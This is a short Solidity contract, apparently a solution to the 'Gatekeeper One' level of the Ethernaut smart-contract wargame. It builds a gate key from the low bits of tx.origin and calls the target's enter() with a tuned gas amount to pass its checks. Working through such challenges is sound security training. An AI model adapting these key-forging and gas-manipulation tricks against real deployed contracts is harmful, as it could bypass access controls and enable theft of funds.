// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperOne {
    function entrant() external view returns (address);
    function enter(bytes8) external returns (bool);
}

contract Attack {
    function enter(address _target, uint256 gas) external {
        IGatekeeperOne target = IGatekeeperOne(_target);

        uint16 k = uint16(uint160(tx.origin));
        uint64 newK = uint64(1 << 63) + uint64(k);
        bytes8 gateKey = bytes8(newK);

        require(target.enter{gas: 8191 * 10 + gas}(gateKey), "Unable to enter");
    }
}
